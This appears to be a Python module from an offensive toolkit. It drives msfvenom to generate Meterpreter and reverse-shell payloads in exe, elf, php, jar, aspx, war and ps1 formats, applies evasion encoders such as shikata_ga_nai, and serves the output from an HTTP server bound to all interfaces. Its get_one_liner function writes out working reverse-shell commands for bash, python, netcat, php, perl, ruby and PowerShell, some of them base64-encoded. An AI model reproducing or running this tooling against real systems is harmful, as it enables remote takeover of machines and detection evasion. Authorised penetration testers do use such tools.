#!/usr/bin/env python3
"""Payload Generator for msfvenom payloads with hosting capabilities."""

import os
import subprocess
import threading
import time
import uuid
import base64
import http.server
import socketserver
from typing import Dict, Any, Optional, List
from core.config import logger

# Directory to store generated payloads
PAYLOAD_DIR = "/tmp/payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)


class PayloadHostServer:
    """Simple HTTP server to host generated payloads."""
    
    def __init__(self, port: int = 8888):
        self.port = port
        self.server = None
        self.thread = None
        self.running = False
    
    def start(self) -> bool:
        """Start the payload hosting server."""
        if self.running:
            return True
        
        try:
            os.chdir(PAYLOAD_DIR)
            handler = http.server.SimpleHTTPRequestHandler
            self.server = socketserver.TCPServer(("0.0.0.0", self.port), handler)
            self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.thread.start()
            self.running = True
            logger.info(f"Payload hosting server started on port {self.port}")
            return True
        except Exception as e:
            logger.error(f"Failed to start payload server: {e}")
            return False
    
    def stop(self):
        """Stop the payload hosting server."""
        if self.server:
            self.server.shutdown()
            self.running = False
            logger.info("Payload hosting server stopped")


class PayloadGenerator:
    """Generate payloads using msfvenom."""
    
    # Common payload templates
    PAYLOAD_TEMPLATES = {
        "windows_meterpreter_reverse_tcp": {
            "payload": "windows/meterpreter/reverse_tcp",
            "format": "exe",
            "extension": ".exe"
        },
        "windows_meterpreter_reverse_https": {
            "payload": "windows/meterpreter/reverse_https",
            "format": "exe",
            "extension": ".exe"
        },
        "windows_shell_reverse_tcp": {
            "payload": "windows/shell_reverse_tcp",
            "format": "exe",
            "extension": ".exe"
        },
        "linux_meterpreter_reverse_tcp": {
            "payload": "linux/x86/meterpreter/reverse_tcp",
            "format": "elf",
            "extension": ""
        },
        "linux_shell_reverse_tcp": {
            "payload": "linux/x86/shell_reverse_tcp",
            "format": "elf",
            "extension": ""
        },
        "python_meterpreter_reverse_tcp": {
            "payload": "python/meterpreter/reverse_tcp",
            "format": "raw",
            "extension": ".py"
        },
        "php_meterpreter_reverse_tcp": {
            "payload": "php/meterpreter/reverse_tcp",
            "format": "raw",
            "extension": ".php"
        },
        "java_meterpreter_reverse_tcp": {
            "payload": "java/meterpreter/reverse_tcp",
            "format": "jar",
            "extension": ".jar"
        },
        "powershell_reverse_tcp": {
            "payload": "windows/powershell_reverse_tcp",
            "format": "raw",
            "extension": ".ps1"
        },
        "aspx_meterpreter_reverse_tcp": {
            "payload": "windows/meterpreter/reverse_tcp",
            "format": "aspx",
            "extension": ".aspx"
        },
        "war_meterpreter_reverse_tcp": {
            "payload": "java/meterpreter/reverse_tcp",
            "format": "war",
            "extension": ".war"
        }
    }
    
    # Common encoders
    ENCODERS = [
        "x86/shikata_ga_nai",
        "x86/fnstenv_mov",
        "x86/call4_dword_xor",
        "x64/xor",
        "x64/zutto_dekiru",
        "php/base64",
        "cmd/powershell_base64"
    ]
    
    def __init__(self):
        self.host_server: Optional[PayloadHostServer] = None
        self.generated_payloads: Dict[str, Dict[str, Any]] = {}
    
    def list_templates(self) -> Dict[str, Any]:
        """List available payload templates."""
        return {
            "success": True,
            "templates": list(self.PAYLOAD_TEMPLATES.keys()),
            "encoders": self.ENCODERS
        }
    
    def generate(self, 
                 lhost: str,
                 lport: int,
                 payload: str = "windows/meterpreter/reverse_tcp",
                 format_type: str = "exe",
                 encoder: str = "",
                 iterations: int = 1,
                 bad_chars: str = "",
                 nops: int = 0,
                 template_name: str = "",
                 output_name: str = "") -> Dict[str, Any]:
        """
        Generate a payload using msfvenom.
        
        Args:
            lhost: Local host IP for callback
            lport: Local port for callback
            payload: Metasploit payload string
            format_type: Output format (exe, elf, raw, etc.)
            encoder: Encoder to use (optional)
            iterations: Encoding iterations
            bad_chars: Bad characters to avoid (e.g., "\\x00\\x0a")
            nops: Number of NOP slides
            template_name: Use a predefined template instead
            output_name: Custom output filename
            
        Returns:
            Generation result with file path and download info
        """
        try:
            # Use template if specified
            if template_name and template_name in self.PAYLOAD_TEMPLATES:
                template = self.PAYLOAD_TEMPLATES[template_name]
                payload = template["payload"]
                format_type = template["format"]
                extension = template["extension"]
            else:
                extension = f".{format_type}" if format_type not in ["raw", "elf"] else ""
            
            # Generate unique filename
            if output_name:
                filename = output_name
            else:
                unique_id = str(uuid.uuid4())[:8]
                filename = f"payload_{unique_id}{extension}"
            
            output_path = os.path.join(PAYLOAD_DIR, filename)
            
            # Build msfvenom command
            cmd = [
                "msfvenom",
                "-p", payload,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", format_type,
                "-o", output_path
            ]
            
            if encoder:
                cmd.extend(["-e", encoder])
                if iterations > 1:
                    cmd.extend(["-i", str(iterations)])
            
            if bad_chars:
                cmd.extend(["-b", bad_chars])
            
            if nops > 0:
                cmd.extend(["-n", str(nops)])
            
            # Execute msfvenom
            logger.info(f"Generating payload: {' '.join(cmd)}")
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120
            )
            
            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"msfvenom failed: {result.stderr}",
                    "command": " ".join(cmd)
                }
            
            # Get file info
            file_size = os.path.getsize(output_path)
            
            # Read file for base64 encoding
            with open(output_path, "rb") as f:
                file_content = f.read()
                file_b64 = base64.b64encode(file_content).decode()
            
            # Store payload info
            payload_id = filename.replace(".", "_")
            self.generated_payloads[payload_id] = {
                "filename": filename,
                "path": output_path,
                "payload": payload,
                "lhost": lhost,
                "lport": lport,
                "format": format_type,
                "size": file_size,
                "created_at": time.time()
            }
            
            return {
                "success": True,
                "payload_id": payload_id,
                "filename": filename,
                "path": output_path,
                "size": file_size,
                "payload_type": payload,
                "format": format_type,
                "base64": file_b64 if file_size < 1024 * 1024 else None,  # Only include b64 for < 1MB
                "msfvenom_output": result.stdout + result.stderr,
                "command": " ".join(cmd)
            }
            
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "msfvenom timed out"}
        except Exception as e:
            logger.error(f"Payload generation failed: {e}")
            return {"success": False, "error": str(e)}
    
    def start_hosting(self, port: int = 8888) -> Dict[str, Any]:
        """Start HTTP server to host payloads."""
        if self.host_server and self.host_server.running:
            return {
                "success": True,
                "message": f"Payload server already running on port {self.host_server.port}",
                "port": self.host_server.port
            }
        
        self.host_server = PayloadHostServer(port)
        if self.host_server.start():
            return {
                "success": True,
                "message": f"Payload hosting server started on port {port}",
                "port": port,
                "url": f"http://0.0.0.0:{port}/"
            }
        return {"success": False, "error": "Failed to start hosting server"}
    
    def stop_hosting(self) -> Dict[str, Any]:
        """Stop the payload hosting server."""
        if self.host_server:
            self.host_server.stop()
            self.host_server = None
            return {"success": True, "message": "Payload hosting server stopped"}
        return {"success": True, "message": "No hosting server was running"}
    
    def list_payloads(self) -> Dict[str, Any]:
        """List all generated payloads."""
        payloads = []
        for pid, info in self.generated_payloads.items():
            exists = os.path.exists(info["path"])
            payloads.append({
                "payload_id": pid,
                "filename": info["filename"],
                "payload_type": info["payload"],
                "lhost": info["lhost"],
                "lport": info["lport"],
                "size": info["size"],
                "exists": exists
            })
        
        return {
            "success": True,
            "payloads": payloads,
            "count": len(payloads),
            "hosting_active": self.host_server.running if self.host_server else False
        }
    
    def delete_payload(self, payload_id: str) -> Dict[str, Any]:
        """Delete a generated payload."""
        if payload_id not in self.generated_payloads:
            return {"success": False, "error": f"Payload {payload_id} not found"}
        
        info = self.generated_payloads.pop(payload_id)
        try:
            if os.path.exists(info["path"]):
                os.remove(info["path"])
        except Exception as e:
            logger.warning(f"Failed to delete payload file: {e}")
        
        return {"success": True, "message": f"Payload {payload_id} deleted"}
    
    def get_one_liner(self, lhost: str, lport: int, shell_type: str = "bash") -> Dict[str, Any]:
        """
        Generate common reverse shell one-liners.
        
        Args:
            lhost: Callback IP
            lport: Callback port
            shell_type: Type of shell (bash, python, nc, php, powershell, perl, ruby)
            
        Returns:
            One-liner commands for the specified shell type
        """
        one_liners = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "bash_b64": base64.b64encode(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1".encode()).decode(),
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
            "nc": f"nc -e /bin/bash {lhost} {lport}",
            "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'",
            "powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            "powershell_b64": "",  # Will be set below
        }
        
        # Generate base64 encoded PowerShell
        ps_cmd = one_liners["powershell"]
        ps_b64 = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
        one_liners["powershell_b64"] = f"powershell -enc {ps_b64}"
        
        if shell_type == "all":
            return {"success": True, "one_liners": one_liners, "lhost": lhost, "lport": lport}
        elif shell_type in one_liners:
            return {"success": True, "one_liner": one_liners[shell_type], "type": shell_type, "lhost": lhost, "lport": lport}
        else:
            return {"success": False, "error": f"Unknown shell type: {shell_type}", "available": list(one_liners.keys())}


# Global instance
payload_generator = PayloadGenerator()
